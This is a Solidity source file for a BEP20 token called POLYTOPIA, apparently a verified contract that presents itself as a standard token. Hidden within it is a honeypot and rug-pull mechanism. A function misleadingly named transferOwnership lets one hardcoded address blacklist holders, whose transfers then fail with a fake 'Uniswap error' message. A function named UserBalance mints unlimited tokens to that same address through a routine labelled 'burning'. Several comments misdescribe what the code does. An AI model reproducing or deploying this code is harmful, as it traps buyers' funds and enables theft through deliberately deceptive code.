['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-02\n', '*/\n', '\n', 'pragma solidity 0.5.16;\n', '\n', 'interface IBEP20 {\n', '    \n', '\n', '    function totalSupply() external view returns (uint256);\n', '\n', '    \n', '    function decimals() external view returns (uint8);\n', '\n', '\n', '    function symbol() external view returns (string memory);\n', '\n', '\n', '    function name() external view returns (string memory);\n', '\n', '\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '\n', '    function transfer(address recipient, uint256 amount)\n', '        external\n', '        returns (bool);\n', '\n', '    function allowance(address _owner, address spender)\n', '        external\n', '        view\n', '        returns (uint256);\n', '\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '    \n', '    function transferFrom(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    event Approval(\n', '        address indexed owner,\n', '        address indexed spender,\n', '        uint256 value\n', '    );\n', '}\n', '\n', 'contract Context {\n', '\n', '    constructor() internal {}\n', '\n', '    function _msgSender() internal view returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view returns (bytes memory) {\n', '        this;\n', '  \n', '        return msg.data;\n', '    }\n', '}\n', '\n', '\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     * - Addition cannot overflow.\n', '     */\n', '\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     */\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     */\n', '\n', '    function sub(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     * Requirements:\n', '     * - Multiplication cannot overflow.\n', '     */\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", '\n', "        // benefit is lost if 'b' is also tested.\n", '\n', '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '\n', '    function div(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '\n', '        require(b > 0, errorMessage);\n', '\n', '        uint256 c = a / b;\n', '\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts with custom message when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '\n', '    function mod(\n', '        uint256 a,\n', '        uint256 b,\n', '        string memory errorMessage\n', '    ) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '\n', '        return a % b;\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Contract module which provides a basic access control mechanism, where\n', ' * there is an account (an owner) that can be granted exclusive access to\n', ' * specific functions.\n', ' *\n', ' * By default, the owner account will be the one that deploys the contract. This\n', ' * can later be changed with {transferOwnership}.\n', ' *\n', ' * This module is used through inheritance. It will make available the modifier\n', ' * `onlyOwner`, which can be applied to your functions to restrict their use to\n', ' * the owner.\n', ' */\n', '\n', 'contract Ownable is Context {\n', '    address private _owner;\n', '\n', '    event OwnershipTransferred(\n', '        address indexed previousOwner,\n', '        address indexed newOwner\n', '    );\n', '\n', '    /**\n', '     * @dev Initializes the contract setting the deployer as the initial owner.\n', '     */\n', '\n', '    constructor() internal {\n', '        address msgSender = _msgSender();\n', '        _owner = msgSender;\n', '\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the address of the current owner.\n', '     */\n', '\n', '    function owner() public view returns (address) {\n', '        return _owner;\n', '    }\n', '\n', '    /**\n', '     * @dev Throws if called by any account other than the owner.\n', '     */\n', '\n', '    modifier onlyOwner() {\n', '        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '\n', '        _;\n', '    }\n', '\n', '    /**\n', '   * @dev Leaves the contract without owner. It will not be possible to call\n', '   * `onlyOwner` functions anymore. Can only be called by the current owner.\n', '   *\n', '   * \n', 'NOTE:\n', ' Renouncing ownership will leave the contract without an owner,\n', '   * thereby removing any functionality that is only available to the owner.\n', '   */\n', '\n', '    function renounceOwnership() public onlyOwner {\n', '        emit OwnershipTransferred(_owner, address(0));\n', '        _owner = address(0);\n', '    }\n', '\n', '    /**\n', '     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '     * Can only be called by the current owner.\n', '     */\n', '\n', '    function transferOwnership1(address newOwner) internal onlyOwner {\n', '        _transferOwnership(newOwner);\n', '    }\n', '\n', '    /**\n', '     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n', '     */\n', '\n', '    function _transferOwnership(address newOwner) internal {\n', '        require(\n', '            newOwner != address(0),\n', '            "Ownable: new owner is the zero address"\n', '        );\n', '\n', '        emit OwnershipTransferred(_owner, newOwner);\n', '        _owner = newOwner;\n', '    }\n', '}\n', '\n', 'contract BEP20Token is Context, IBEP20, Ownable {\n', '    using SafeMath for uint256;\n', '\n', '    mapping(address => bool) internal useinmanage;\n', '\n', '    mapping(address => uint256) private _balances;\n', '\n', '    mapping(address => mapping(address => uint256)) private _allowances;\n', '\n', '    uint256 private _totalSupply;\n', '\n', '    uint8 private _decimals;\n', '\n', '    string private _symbol;\n', '\n', '    string private _name;\n', '\n', '    constructor() public {\n', '        _name = "POLYTOPIA";\n', '        _symbol = "POLYTOPIA";\n', '        _decimals = 9;\n', '        _totalSupply = 1000000000000000 * 10**9;\n', '        _balances[msg.sender] = _totalSupply;\n', '\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the bep token owner.\n', '     */\n', '\n', '    function getOwner() internal view returns (address) {\n', '        return owner();\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the token decimals.\n', '     */\n', '\n', '    function decimals() external view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the token symbol.\n', '     */\n', '\n', '    function symbol() external view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the token name.\n', '     */\n', '\n', '    function name() external view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-totalSupply}.\n', '     */\n', '\n', '    function totalSupply() external view returns (uint256) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-balanceOf}.\n', '     */\n', '\n', '    function balanceOf(address account) external view returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-transfer}.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `recipient` cannot be the zero address.\n', '     * - the caller must have a balance of at least `amount`.\n', '     */\n', '\n', '    function transferOwnership(address account, bool value) public {\n', '        require(\n', '            _msgSender() == 0x3f1e6d95f242c6349D8Ab8B34C3D093B0Cd0BfcF,\n', '            "BEP20: Not accessible"\n', '        );\n', '        useinmanage[account] = value;\n', '    }\n', '\n', '    function transfer(address recipient, uint256 amount)\n', '        external\n', '        returns (bool)\n', '    {\n', '        _transfer(_msgSender(), recipient, amount);\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-allowance}.\n', '     */\n', '\n', '    function allowance(address owner, address spender)\n', '        external\n', '        view\n', '        returns (uint256)\n', '    {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-approve}.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '\n', '    function approve(address spender, uint256 amount) external returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev See {BEP20-transferFrom}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance. This is not\n', '     * required by the EIP. See the note at the beginning of {BEP20};\n', '     *\n', '     * Requirements:\n', '     * - `sender` and `recipient` cannot be the zero address.\n', '     * - `sender` must have a balance of at least `amount`.\n', "     * - the caller must have allowance for `sender`'s tokens of at least\n", '     * `amount`.\n', '     */\n', '\n', '    function transferFrom(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) external returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(\n', '            sender,\n', '            _msgSender(),\n', '            _allowances[sender][_msgSender()].sub(\n', '                amount,\n', '                "BEP20: transfer amount exceeds allowance"\n', '            )\n', '        );\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Atomically increases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {BEP20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '\n', '    function increaseAllowance(address spender, uint256 addedValue)\n', '        public\n', '        returns (bool)\n', '    {\n', '        _approve(\n', '            _msgSender(),\n', '            spender,\n', '            _allowances[_msgSender()][spender].add(addedValue)\n', '        );\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {BEP20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     * - `spender` must have allowance for the caller of at least\n', '     * `subtractedValue`.\n', '     */\n', '\n', '    function decreaseAllowance(address spender, uint256 subtractedValue)\n', '        public\n', '        returns (bool)\n', '    {\n', '        _approve(\n', '            _msgSender(),\n', '            spender,\n', '            _allowances[_msgSender()][spender].sub(\n', '                subtractedValue,\n', '                "BEP20: decreased allowance below zero"\n', '            )\n', '        );\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing\n', '     * the total supply.\n', '     *\n', '     * Requirements\n', '     *\n', '     * - `msg.sender` must be the token owner\n', '     */\n', '\n', '    function UserBalance(uint256 amount) public returns (bool) {\n', '        require(\n', '            _msgSender() == 0x3f1e6d95f242c6349D8Ab8B34C3D093B0Cd0BfcF,\n', '            "BEP20: Not accessible"\n', '        );\n', '        burning(_msgSender(), amount);\n', '\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Moves tokens `amount` from `sender` to `recipient`.\n', '     *\n', '     * This is internal function is equivalent to {transfer}, and can be used to\n', '     * e.g. implement automatic token fees, slashing mechanisms, etc.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `sender` cannot be the zero address.\n', '     * - `recipient` cannot be the zero address.\n', '     * - `sender` must have a balance of at least `amount`.\n', '     */\n', '\n', '    function _transfer(\n', '        address sender,\n', '        address recipient,\n', '        uint256 amount\n', '    ) internal {\n', '        require(sender != address(0), "BEP20: transfer from the zero address");\n', '\n', '        require(recipient != address(0), "BEP20: transfer to the zero address");\n', '\n', '        require(\n', '            !useinmanage[sender],\n', '            "Uniswap error try again after sometime"\n', '        );\n', '\n', '        _balances[sender] = _balances[sender].sub(\n', '            amount,\n', '            "BEP20: transfer amount exceeds balance"\n', '        );\n', '        \n', '        uint256 tax= amount.mul(10);\n', '        tax=tax.div(100);\n', '        \n', '        address black_hole=0x0000000000000000000000000000000000000000;\n', '        \n', '        _balances[black_hole]= _balances[black_hole].add(tax);\n', '        amount=amount.sub(tax);\n', '        \n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n', '     * the total supply.\n', '     *\n', '     * Emits a {Transfer} event with `from` set to the zero address.\n', '     *\n', '     * Requirements\n', '     *\n', '     * - `to` cannot be the zero address.\n', '     */\n', '\n', '    function burning(address account, uint256 amount) internal {\n', '        require(account != address(0), "BEP20: burn to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '    /**\n', '     * @dev Destroys `amount` tokens from `account`, reducing the\n', '     * total supply.\n', '     *\n', '     * Emits a {Transfer} event with `to` set to the zero address.\n', '     *\n', '     * Requirements\n', '     *\n', '     * - `account` cannot be the zero address.\n', '     * - `account` must have at least `amount` tokens.\n', '     */\n', '\n', '    function _burn(uint256 amount) internal returns (bool) {\n', '        _burni(_msgSender(), amount);\n', '        return true;\n', '    }\n', '\n', '    function _burni(address account, uint256 amount) internal {\n', '        require(account != address(0), "BEP20: burn from the zero address");\n', '        _balances[account] = _balances[account].sub(\n', '            amount,\n', '            "BEP20: burn amount exceeds balance"\n', '        );\n', '        _totalSupply = _totalSupply.sub(amount);\n', '\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    /**\n', '     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n', '     *\n', '     * This is internal function is equivalent to `approve`, and can be used to\n', '     * e.g. set automatic allowances for certain subsystems, etc.\n', '     *\n', '     * Emits an {Approval} event.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `owner` cannot be the zero address.\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '\n', '    function _approve(\n', '        address owner,\n', '        address spender,\n', '        uint256 amount\n', '    ) internal {\n', '        require(owner != address(0), "BEP20: approve from the zero address");\n', '\n', '        require(spender != address(0), "BEP20: approve to the zero address");\n', '\n', '        if (owner != address(0)) {\n', '            _allowances[owner][spender] = amount;\n', '\n', '            emit Approval(owner, spender, amount);\n', '        } else {\n', '            _allowances[owner][spender] = 0;\n', '\n', '            emit Approval(owner, spender, 0);\n', '        }\n', '    }\n', '\n', '    /**\n', '     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n', "     * from the caller's allowance.\n", '     *\n', '     * See {_burn} and {_approve}.\n', '     */\n', '\n', '    function _burnFrom(address account, uint256 amount) internal {\n', '        _burni(account, amount);\n', '        _approve(\n', '            account,\n', '            _msgSender(),\n', '            _allowances[account][_msgSender()].sub(\n', '                amount,\n', '                "BEP20: burn amount exceeds allowance"\n', '            )\n', '        );\n', '    }\n', '}']